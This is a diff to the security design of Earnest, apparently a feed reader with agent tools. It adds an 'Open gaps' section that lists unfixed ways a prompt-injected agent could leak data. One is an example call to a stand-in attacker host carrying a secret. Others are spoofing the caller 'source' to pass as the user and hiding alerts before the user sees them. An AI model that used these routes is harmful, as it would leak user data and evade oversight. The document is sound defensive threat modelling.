@@ -120,7 +120,7 @@ Invariants, each to be tested directly:
 
 7. **Agent selection stays unobservable to publishers.** An injected agent can choose between attacker-written entries according to a secret and surface the chosen one in a brief or alert. If opening it loads a remote image or preview, the attacker sees the choice. So every automatic fetch caused by agent-selected output (entry images, previews, notification rendering) comes only from what was cached at ingest, or waits for your click. Following a link yourself is outside this guarantee.
 
-Within those limits, an agent with Earnest as its only tool has no path found so far for sending your data to an attacker. That has been reviewed, not proven; keep attacking it.
+Within those limits, and apart from the [open gaps](#open-gaps), an agent with Earnest as its only tool has no path found so far for sending your data to an attacker. That has been reviewed, not proven; keep attacking it.
 
 ### Attacks inside Earnest
 
@@ -145,6 +145,17 @@ Within those limits, an agent with Earnest as its only tool has no path found so
 | 4 | Subscribe, unsubscribe, refresh, delete, new tokens, new rules, new webhooks | You, in the UI or CLI. Agents can file a proposal | n/a |
 
 Don't promise universal undo. Say which actions can be reverted, which cancelled and which are final. A revert checks the current revision and refuses to overwrite a later edit of yours.
+
+### Open gaps
+
+[The ninth review](raw/r6-security.md) found these, and they aren't closed yet. The first two are exits.
+
+- **Proposals.** Approving `propose_subscription` fetches a URL the agent chose, so `subscribe("https://attacker.example/?secret=...")` returns behind one click. Proposed tokens and webhooks would carry agent-chosen scopes and destinations. Either a proposal can't carry a URL or destination and you enter it yourself, or approval shows it in full as untrusted. No review screen is specified yet.
+- **Endpoints without a scope.** Agent scopes are defined for the MCP tools; the REST endpoints name none. `/v1/devices` is the worst, since a push endpoint is a destination the server posts to. `/v1/changes`, `/v1/events`, `/v1/opml`, `/v1/export`, `GET /v1/notifications` and `/v1/activity` name no scope or allowlist filter either. Deny agent tokens by default, and keep device registration yours only, like webhooks.
+- **Caller-supplied `source`.** `state:batch` takes `source` from the caller and the conflict policy ranks by it, so an agent holding `state:write-human` can pass as your deliberate action. Derive it on the server from the token and the kind of operation, so your scrolling stays passive, and ignore the caller's value.
+- **Clusters across the allowlist.** A cluster can mix allowlisted entries with private ones, and `get_briefing` groups by cluster. Filter membership by the token's allowlist when reading.
+- **Annotations in retrieval.** Agent annotations stay out of embeddings, clustering, editions and classifiers, but search and ask my feeds aren't covered.
+- **Hiding, not leaking.** An agent with `state:write-human` can mark an alert Done before you see it. The log records it, but only if you look. Plausible, not confirmed.
 
 ### External agents
 
